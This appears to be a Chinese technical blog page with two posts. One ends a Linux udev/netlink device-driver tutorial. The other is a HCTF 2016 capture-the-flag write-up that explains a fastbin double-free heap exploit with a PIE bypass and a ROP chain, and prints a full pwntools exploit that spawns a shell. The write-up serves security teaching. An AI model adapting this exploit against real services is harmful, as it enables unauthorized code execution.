<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;devices</span><br><span class="line">Character devices:</span><br><span class="line">  1 mem</span><br><span class="line">  4 &#x2F;dev&#x2F;vc&#x2F;0</span><br><span class="line">  4 tty</span><br><span class="line">  4 ttyS</span><br><span class="line">  5 &#x2F;dev&#x2F;tty</span><br><span class="line">  5 &#x2F;dev&#x2F;console</span><br><span class="line">  5 &#x2F;dev&#x2F;ptmx</span><br><span class="line">  ...</span><br><span class="line">Block devices:</span><br><span class="line">259 blkext</span><br><span class="line">  7 loop</span><br><span class="line">  8 sd</span><br><span class="line">  9 md</span><br><span class="line"> 11 sr</span><br><span class="line"> 65 sd</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>查看<code>/dev</code>目录可以获知系统中包含的设备文件，日期前的两列对应设备的主设备号和次设备号：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al &#x2F;dev</span><br><span class="line">crw-r-----   1 root    kmem      1,   4  3月  5 14:03 port</span><br><span class="line">crw-rw----   1 root    dip     108,   0  3月  5 14:03 ppp</span><br><span class="line">crw-rw-rw-   1 root    tty       5,   2  3月  5 14:32 ptmx</span><br></pre></td></tr></table></figure>
<p>主设备号是与驱动对应的概念，同一类设备一般用相同的主设备号，不同类设备的主设备号一般不同。</p>
<h2 id="udev用户空间设备管理"><a href="#udev用户空间设备管理" class="headerlink" title="udev用户空间设备管理"></a>udev用户空间设备管理</h2><p><code>udev</code>完全在用户态工作，利用设备加入或移除时内核所发送的<code>热插拔事件（Hotplug Event）</code>来工作。在热插拔时，设备的详细信息会由内核通过netlink套接字发送出来，发出的事件叫<code>uevent</code>。<code>udev</code>的设备命名策略、权限控制和事件处理都是在用户态下完成的，它利用从内核收到的信息来进行创建设备文件节点等工作。下面给出从内核通过netlink接收热插拔事件的使用范例：<br><strong>代码清单</strong> netlink.c  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(<span class="number">2</span>,s,<span class="built_in">strlen</span>(s));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nls</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pfd</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open hotplug event netlink socket</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;nls,<span class="number">0</span>,<span class="keyword">sizeof</span>(struct sockaddr_nl));</span><br><span class="line">    nls.nl_family = AF_NETLINK;</span><br><span class="line">    nls.nl_pid = getpid();</span><br><span class="line">    nls.nl_groups = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    pfd.events = POLLIN;</span><br><span class="line">    pfd.fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);</span><br><span class="line">    <span class="keyword">if</span> (pfd.fd==<span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;Not root\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Listen to netlink socket</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(pfd.fd, (<span class="keyword">void</span> *)&amp;nls, <span class="keyword">sizeof</span>(struct sockaddr_nl)))</span><br><span class="line">        die(<span class="string">&quot;Bind failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">-1</span>!=poll(&amp;pfd, <span class="number">1</span>, <span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="keyword">int</span> i, len = recv(pfd.fd, buf, <span class="keyword">sizeof</span>(buf), MSG_DONTWAIT);</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">-1</span>) die(<span class="string">&quot;recv\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Print the data to stdout.</span></span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i&lt;len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf+i);</span><br><span class="line">            i += <span class="built_in">strlen</span>(buf+i)+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    die(<span class="string">&quot;poll\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Dear gcc: shut up.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译上述程序并运行，出入一个金士顿的U盘，该程序会打印出类似如下的信息。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ACTION&#x3D;add</span><br><span class="line">DEVLINKS&#x3D;&#x2F;dev&#x2F;disk&#x2F;by-id&#x2F;usb-Kingston_DataTraveler_2.0_00241D8CE3F71F70290F0510-0:0-part4 &#x2F;dev&#x2F;disk&#x2F;by-label&#x2F;Ubuntu\x2016.0 &#x2F;dev&#x2F;disk&#x2F;by-path&#x2F;pci-0000:00:06.0-usb-0:2:1.0-scsi-0:0:0:0-part4 &#x2F;dev&#x2F;disk&#x2F;by-uuid&#x2F;B4FE-5315</span><br><span class="line">DEVNAME&#x3D;&#x2F;dev&#x2F;sdb4</span><br><span class="line">DEVPATH&#x3D;&#x2F;devices&#x2F;pci0000:00&#x2F;0000:00:06.0&#x2F;usb1&#x2F;1-2&#x2F;1-2:1.0&#x2F;host3&#x2F;target3:0:0&#x2F;3:0:0:0&#x2F;block&#x2F;sdb&#x2F;sdb4</span><br><span class="line">DEVTYPE&#x3D;partition</span><br><span class="line">ID_BUS&#x3D;usb</span><br><span class="line">ID_FS_LABEL&#x3D;Ubuntu_16.0</span><br><span class="line">ID_FS_LABEL_ENC&#x3D;Ubuntu\x2016.0</span><br><span class="line">ID_FS_TYPE&#x3D;vfat</span><br><span class="line">ID_FS_USAGE&#x3D;filesystem</span><br><span class="line">ID_</span><br></pre></td></tr></table></figure>
<p>udev就是采用这种方式接收netlink消息，并根据它的内容和用户设置给udev的规则做匹配来进行工作的。<br><strong>reference</strong><br>《Linux设备驱动开发详解——基于最新的Linux 4.0内核》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/02/25/fastbin%E4%B8%8A%E7%9A%84%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/02/25/fastbin%E4%B8%8A%E7%9A%84%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">fastbin上的堆漏洞利用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-02-25 19:45:06" itemprop="dateCreated datePublished" datetime="2017-02-25T19:45:06+08:00">2017-02-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一个hctf2016的比赛题目，题目中的漏洞是堆相关的，但与之前写过的堆漏洞有所不同，程序中申请的堆块比较小，只能用<code>uaf</code>去利用。<br>经过对程序的分析，分析出如下两个结构体：<br><img src="/images/uaf/struct.png"><br><code>str_struct</code>是漏洞利用所用到的结构体，每次创建字符串都会malloc一个这个结构。<br>漏洞发生在<code>delete_str</code>函数中，在delete时没有检查这块内存是否被释放过，造成double free。<br><img src="/images/uaf/delete.png">  </p>
<h3 id="构造uaf"><a href="#构造uaf" class="headerlink" title="构造uaf"></a>构造uaf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">4</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fastbin-&gt;chunk0</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># fastbin-&gt;chunk1-&gt;chunk0</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fastbin-&gt;chunk0-&gt;chunk1-&gt;chunk0</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># 长度为0，没有拷贝 fastbin-&gt;chunk1-&gt;chunk0-&gt;chunk1</span></span><br><span class="line"><span class="comment"># malloc-ptr: fastbin-&gt;chunk0-&gt;chunk1</span></span><br><span class="line"><span class="comment"># malloc-dest: fastbin-&gt;chunk1</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x16</span> + <span class="string">&#x27;lo&#x27;</span> + <span class="string">&#x27;\x2d\x00&#x27;</span>) <span class="comment"># 0x2d会覆盖free func的最后一位，覆盖为puts的地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>利用fastbin使用单向链表并且不检查double free的特点，对两个堆块进行释放，chunk0释放了两次，fastbin上的链表变成了循环链表，再以适当的方式申请堆块，就可以使字符串缓冲区和带有函数指针的控制块重合，使覆盖函数指针成为可能。<br><strong>注：</strong>在调试fastbin时，又跟青神学到了新的调试方法，在gdb中使用命令：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena.fastbinsY</span><br></pre></td></tr></table></figure>
<p>可以打印出fastbin中的内容。不过要先安装一个库：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libc6-dbg</span><br></pre></td></tr></table></figure>

<h3 id="绕过PIE"><a href="#绕过PIE" class="headerlink" title="绕过PIE"></a>绕过PIE</h3><p>为了绕过PIE，需要leak一个程序中代码的地址。PIE保护开启，地址的最低位一个字节还是不变的。通过覆盖一个字节的函数指针最低位，使得本来调用的<code>free*</code>函数，跳转到一个能leak地址的地方。<br>main函数中的这个<code>puts</code>与<code>free*</code>函数地址只差最低位的一个字节，而且调用后不会返回，可以将要free的地址中的内容打印出来，且程序不会崩溃。<br><img src="/images/uaf/puts.png"></p>
<h3 id="找到存放ROP的位置"><a href="#找到存放ROP的位置" class="headerlink" title="找到存放ROP的位置"></a>找到存放ROP的位置</h3><p>能够控制的函数指针在<code>delete</code>函数中，因此ROP最方便也是存放在<code>delete</code>函数的栈中。这里恰好有一个较大的<code>buf</code>变量，通过<code>pop|ret</code>调整<code>rsp</code>使得ROP得以执行。</p>
<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>能够使用ROP就可以构造任意地址读，可以获得服务器的libc版本，从而得知函数偏移。<br>下面是完整的exp：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, string</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;create &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;str:&#x27;</span>)</span><br><span class="line">    r.send(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span>, sure = <span class="string">&#x27;yes&#x27;</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;sure?:&#x27;</span>)</span><br><span class="line">    r.sendline(sure)</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fastbin-&gt;chunk0</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># fastbin-&gt;chunk1-&gt;chunk0</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fastbin-&gt;chunk0-&gt;chunk1-&gt;chunk0</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># 长度为0，没有拷贝 fastbin-&gt;chunk1-&gt;chunk0-&gt;chunk1</span></span><br><span class="line"><span class="comment"># malloc-ptr: fastbin-&gt;chunk0-&gt;chunk1</span></span><br><span class="line"><span class="comment"># malloc-dest: fastbin-&gt;chunk1</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x16</span> + <span class="string">&#x27;lo&#x27;</span> + <span class="string">&#x27;\x2d\x00&#x27;</span>) <span class="comment"># 0x2d会覆盖free func的最后一位，覆盖为puts的地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;lo&#x27;</span>)</span><br><span class="line">puts_addr = r.recvline()[:<span class="number">-1</span>]</span><br><span class="line">base_addr = u64(puts_addr.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0xd2d</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;base_addr = &#x27;</span> + <span class="built_in">hex</span>(base_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 调用free2，先free chunk0再free chunk1: fastbin-&gt;chunk1-&gt;chunk0-&gt;chunk1</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># fastbin-&gt;chunk0-&gt;chunk1-&gt;chunk0</span></span><br><span class="line"><span class="comment"># malloc-ptr: fastbin-&gt;chunk1-&gt;chunk0</span></span><br><span class="line"><span class="comment"># malloc-dest: fastbin-&gt;chunk0</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(base_addr + <span class="number">0x11dc</span>)) <span class="comment"># pop_pop_pop_pop_ret</span></span><br><span class="line"></span><br><span class="line">payload = p64(base_addr + <span class="number">0x11e3</span>) <span class="comment"># pop_rdi_ret</span></span><br><span class="line">payload += p64(base_addr + <span class="number">0x202070</span>) <span class="comment"># malloc@got</span></span><br><span class="line">payload += p64(base_addr + <span class="number">0x990</span>) <span class="comment"># puts@plt</span></span><br><span class="line">payload += p64(base_addr + <span class="number">0x11e3</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(base_addr + <span class="number">0x11da</span>) <span class="comment"># pop6_ret</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(base_addr + <span class="number">0x202058</span>) <span class="comment"># r12 -&gt; rip read@got</span></span><br><span class="line">payload += p64(<span class="number">8</span>) <span class="comment"># r13 -&gt; rdx</span></span><br><span class="line">payload += p64(base_addr + <span class="number">0x202078</span>) <span class="comment"># r14 -&gt; rsi atoi@got</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r15 -&gt; rdi</span></span><br><span class="line">payload += p64(base_addr + <span class="number">0x11c0</span>) <span class="comment"># 通用gadget</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">7</span></span><br><span class="line">payload += p64(base_addr + <span class="number">0xb65</span>) <span class="comment"># read_num</span></span><br><span class="line">delete(<span class="number">1</span>, <span class="string">&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>) + payload)</span><br><span class="line"></span><br><span class="line">malloc_addr = u64(r.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = malloc_addr - <span class="number">0x83580</span></span><br><span class="line">system_addr = libc_addr + <span class="number">0x45390</span></span><br><span class="line">r.sendline(p64(system_addr) + <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1pLpX1A7">题目下载</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/121778.html?utm_source=tuicool&amp;utm_medium=referral">http://www.freebuf.com/articles/web/121778.html?utm_source=tuicool&amp;utm_medium=referral</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Bruce Fan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
